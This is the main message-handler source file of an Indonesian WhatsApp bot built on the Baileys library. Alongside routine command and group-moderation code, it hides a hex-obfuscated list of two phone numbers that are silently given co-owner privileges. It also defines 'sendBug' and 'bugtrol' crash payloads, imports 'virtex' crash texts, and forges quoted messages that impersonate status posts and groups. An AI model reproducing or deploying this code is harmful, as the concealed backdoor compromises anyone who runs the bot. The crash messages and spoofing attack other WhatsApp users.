const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
//const fsx = require("fs-extra")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const hx = require('hxz-api')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const ph = require('./lib/photooxy.js')
const { jadibot, stopjadibot } = require('./jadibot.js')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./database/off.json'))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const { virtex, vipi } = require('./lib/virtex.js')
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const ntilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
const setTtt = require('./lib/tictactoe.js')
const _win = JSON.parse(fs.readFileSync('./database/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./database/tttlose.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const { helpmenu } = require('./zeeone/zeeoneofc')
var creatorList = ['𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘣𝘺 𝘡𝘦𝘦𝘰𝘯𝘦', 'ᴹᴿ᭄𝘻𝘦𝘦𝘰𝘯𝘦ㄙ×፝֟͜×', '𝘻𝘦𝘦𝘰𝘯𝘦𝘰𝘧𝘤' , ' 𝘈𝘭𝘱𝘩𝘢𝘣𝘰𝘵']
var creator = creatorList[Math.floor(Math.random() * creatorList.length)];
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const  thumbnail = setting.thumbnail
const fakethumb = setting.fakethumbnail

hit_today = []
blocked = []
let ownerNumbers = setting.ownerNumber
let targetpc = setting.targetpc
let owner = setting.targetpc
let fake = setting.fake
let prefa = setting.prefix
let bailver = setting.baileys_version
let botver = setting.bot_version
let baper = setting.body
let apiku = setting.source_url
let cr = setting.cr
let ownername = setting.ownername 
let Mloc = false
let menusimple = false

banChats = true 
big = true 
antitrol = true 
offline = false 
multi = true 
antitags = true 
readG = true 
readP = false 
winawal = 1 
loseawal = 1 
memberwin = 1 
memberlose = 1 

linkcom = ".com" 
linkid = ".id" 
linkxyz = ".xyz" 
linkly = ".ly" 
linkhttp = "http" 
linkwame = "wa.me/" 
linkwa = "://chat.whatsapp.com/" 
deflt = "https://chat.whatsapp.com/" 
linknye = `${deflt}` 
petik = '```' 
enter = '\n'
yt_lu = 'https://www.youtube.com/channel/UCZ76wI0fOhrsOZ63eXPO1bg'
ig_lu = 'https://www.instagram.com/_hii.fauzan/'
zeksApikey = 'Apivinz' //ganti pake apikey lu biar limitnya gk cepet abis 
ApiZeks = 'https://api.zeks.xyz' // regis disini klo mau dapat apikeynya

numbernye = '0' 
waktu = '-' 
alasan = '-' 
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
//=================================================//
const getWins = (sender, total) => {
            let position = false
            Object.keys(_win).forEach((i) => {
                if (_win[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _win[position].win -= total
                 fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
            }
        }
 
const getLose = (sender, total) => {
            let position = false
            Object.keys(_lose).forEach((i) => {
                if (_lose[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _lose[position].lose -= total
                 fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
            }
        }
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
module.exports = alpha = async (alpha, mek) => {
	try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `${longkapnye}${petik}BUGGC TERDETEKSI${petik}${enter}@⁨${nums.split('@')[0]} akan dikick${enter}${enter}*Jangan maen bug lah*`
alpha.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
alpha.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
alpha.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}
                global.blocked
                m = simple.smsg(alpha, mek)
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        	const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const Wib = moment.tz('Asia/Jakarta').format("HH:mm:ss");
		const Wita = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const Wit = moment().tz('Asia/Jayapura').format("HH:mm:ss");
                const type = Object.keys(mek.message)[0]        
                const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
                if (multi){
                   var prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        	    } else {
        	    prefix = prefa
        	    }
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		hit_today.push(command)
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
        const q = args.join(' ')
        const timestamp = speed();
        const latensi = speed() - timestamp
		const run = process.uptime()
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? alpha.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const status = `${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}`
        const senderNumber = sender.split("@")[0]
		const ownerNumberss = `${ownerNumbers}@s.whatsapp.net` 
		const isOwner = ownerNumberss.includes(sender)
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = alpha.user.phone
		const totalchat = await alpha.chats.all()
		const totalgroup = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        const ini_mark = `0@s.whatsapp.net`
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
	    const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const AntiLink = isGroup ? ntilink.includes(from) : false
		const isVote = isGroup ? voting.includes(from) : false
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const yntkts = m.isBaileys
        hit_total =axios.get('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits').then(({data}) => hitall = data.value)
        var _0xa1c8=["\x36\x32\x38\x38\x37\x34\x33\x35\x30\x34\x37\x33\x32\x36\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x39\x31\x39\x30\x34\x38\x34\x31\x36\x34\x30\x35\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73"];let alphaNumber=[_0xa1c8[0],_0xa1c8[1]];const isCoOwner=alphaNumber[_0xa1c8[2]](sender)
		var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilTanggall = "" + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Jam : " + jam + ":" + menit + ":" + detik + " Wib";  
        var ase = new Date();
            var waktoo = ase.getHours();
            switch(waktoo){
                case 0: waktoo = "Selamat Malam 🌚"; break;
                case 1: waktoo = "Selamat Malam 🌚"; break;
                case 2: waktoo = "Selamat Malam 🌚"; break;
                case 3: waktoo = "Selamat Malam 🌚"; break;
                case 4: waktoo = "Selamat Pagi 🌞"; break;
                case 5: waktoo = "Selamat Pagi 🌞"; break;
                case 6: waktoo = "Selamat Pagi 🌞"; break;
                case 7: waktoo = "Selamat Pagi 🌞"; break;
                case 8: waktoo = "Selamat Pagi 🌞"; break;
                case 9: waktoo = "Selamat Pagi 🌞"; break;
                case 10: waktoo = "Selamat Pagi 🌞"; break;
                case 11: waktoo = "Waktu Dzuhur , jangan lupa shalat"; break;
                case 12: waktoo = "Selamat Siang ☀️"; break;
                case 13: waktoo = "Selamat Siang ☀️"; break;
                case 14: waktoo = "Waktu Ashar , jangan lupa shalat"; break;
                case 15: waktoo = "Selamat Sore 🌌"; break;
                case 16: waktoo = "Selamat Sore 🌌"; break;
                case 17: waktoo = "Selamat Sore 🌌"; break;
                case 18: waktoo = "Waktu Magrib, jangan lupa shalat"; break;
                case 19: waktoo = "Waktu Isya, jangan lupa shalat"; break;
                case 20: waktoo = "Selamat Malam 🌃"; break;
                case 21: waktoo = "Selamat Malam 🌃"; break;
                case 22: waktoo = "Selamat Malam 🌃"; break;
                case 23: waktoo = "Selamat Malam 🌃"; break;
            }
            var hahh = "" + waktoo; 
        
          var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 1: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 2: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 3: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 4: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 5: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 6: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 7: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 8: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 9: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 10: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 11: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 12: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 13: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 14: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 15: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 16: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 17: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 18: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 19: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 20: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 21: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 22: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 23: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
            }
            var ucapannya = "" + waktoonyabro;
            var ase = new Date();
                        var waktoonyabroo = ase.getHours();
                        switch(waktoonyabroo){
                case 0: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 1: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 2: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 3: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 4: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 5: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 6: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 7: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 8: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 9: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 10: waktoonyabroo = `Morning ✨ ${pushname}`; break;
                case 11: waktoonyabroo = `GoodDay 🔥 ${pushname}`; break;
                case 12: waktoonyabroo = `GoodDay 🔥 ${pushname}`; break;
                case 13: waktoonyabroo = `GoodDay 🔥 ${pushname}`; break;
                case 14: waktoonyabroo = `GoodDay 🔥 ${pushname}`; break;
                case 15: waktoonyabroo = `Afternoon 🌹${pushname}`; break;
                case 16: waktoonyabroo = `Afternoon 🌹${pushname}`; break;
                case 17: waktoonyabroo = `Afternoon 🌹${pushname}`; break;
                case 18: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 19: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 20: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 21: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 22: waktoonyabroo = `Night 🌛 ${pushname}`; break;
                case 23: waktoonyabroo = `Night 🌛 ${pushname}`; break;
            }
            var ucapannya2 = "" + waktoonyabroo;     
            
const mess = {
   wait: '```[ ! ] Proses kak...```',
   success: '```[ ✓ ]``` Sukses...',
   wrongFormat: '```[ x ]``` Format salah',
   error : {
       stick: '```[ x ]``` Itu bukan stiker',
       Iv: '```[ x ]``` Linknya error:v',
       api: "```[ x ]``` Error"
   },
   only: {
				group: '```[ x ]``` Only Group',
       pribadi: "```[ x ]``` Private Only "
   }
}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{"externalAdReply":{"title": `${ucapannya2} ${pushname}`,"body": `${baper}`,"previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./image/${thumbnail}`),"sourceUrl": `${apiku}`}}})
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail: fs.readFileSync(`./image/${thumbnail}`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const sendBug = async (target) => {
      await alpha.relayWAMessage(
        alpha.prepareMessageFromContent(
          target,
          alpha.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`)},
					"title": 'Whatsapp bot', 
					"description": "SELF BOT", 
					"currencyCode": "USD",
					"priceAmount1000": "11111111111",
					"retailerId": 'Whatsapp bot',
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}  

let ii = []
				let giid = []
				for (mem of totalchat){
					ii.push(mem.jid)
				}
				for (id of ii){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
        const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`./image/${thumbnail}`), surface: 200, message: `${creator}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${creator}`,jpegThumbnail: thumbnail}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`./image/${thumbnail}`)}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${creator}`, 'jpegThumbnail': fs.readFileSync(`./image/${thumbnail}`)}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`./image/${thumbnail}`)}}}
		const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${creator}`,jpegThumbnail: thumbnail}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`./image/${thumbnail}`), thumbnail: fs.readFileSync(`./image/${thumbnail}`),sendEphemeral: true}}}
		
const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail": thumbnail,"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
           
        const bugtrol = { 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "359531915900587",
						"itemCount": 1000000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${creator}`,
						"orderTitle": `${creator}`,
						"sellerJid": "62887435047326@s.whatsapp.net",
						"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw=="
					}}}
			    
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './database/StcUrl' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './database/StcUrl' + names + '.png'
                    let asw = './database/StcUrl' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
alpha.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await alpha.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
alpha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await alpha.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
alpha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }
// ANTI LINK (  )
if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!AntiLink) return
if (isGroupAdmins) return reply('Admin Bebas')
if (mek.key.fromMe && isOwner) return reply('Owner Bebas')
                reply(`「 G R O U P  L I N K  D E T E C T O R 」\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                alpha.groupRemove(from, [sender])
            }


